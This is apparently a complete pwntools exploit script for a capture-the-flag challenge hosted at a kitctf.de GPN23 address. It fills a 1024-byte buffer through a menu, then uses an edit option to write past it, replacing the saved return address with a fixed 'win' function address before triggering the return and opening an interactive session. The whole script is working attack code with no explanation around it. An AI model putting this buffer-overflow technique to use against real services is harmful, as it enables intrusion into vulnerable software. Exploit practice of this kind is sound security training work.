from pwn import *

context.log_level = 'debug'

# Set up connection
host = "redcourt-of-hyper-extreme-riches.gpn23.ctf.kitctf.de"
port = 443

def exploit():
    try:
        p = remote(host, port, ssl=True)
        WIN_ADDR = 0x401221
        BUFFER_SIZE = 1024

        def reset():
            p.recvuntil(b'6. Quit\n')
            p.sendline(b'1')

        def append(data):
            p.recvuntil(b'6. Quit\n')
            p.sendline(b'3')
            p.recvuntil(b'bytes left):\n')
            p.send(data)

        def edit(offset, length, data):
            p.recvuntil(b'6. Quit\n')
            p.sendline(b'4')
            p.recvuntil(b'offset where you want to start editing: ')
            p.sendline(str(offset).encode())
            p.recvuntil(b'How many bytes do you want to overwrite: ')
            p.sendline(str(length).encode())
            p.send(data)

        # Step 1: Fill buffer in smaller chunks
        reset()
        for _ in range(10):
            append(b'A'*100 + b'\n')  # 10 x 100 = 1000 bytes + newlines
            time.sleep(0.1)

        # Step 2: Calculate precise overflow
        # We'll leave 8 bytes at the end and overwrite return address
        offset = BUFFER_SIZE - 16
        length = 16
        payload = b'B'*8 + p64(WIN_ADDR)

        # Step 3: Perform the overflow
        edit(offset, length, payload)
        time.sleep(0.5)

        # Step 4: Trigger return
        p.sendline(b'6')

        p.interactive()

    except Exception as e:
        print(f"Error: {e}")
    finally:
        p.close()

exploit()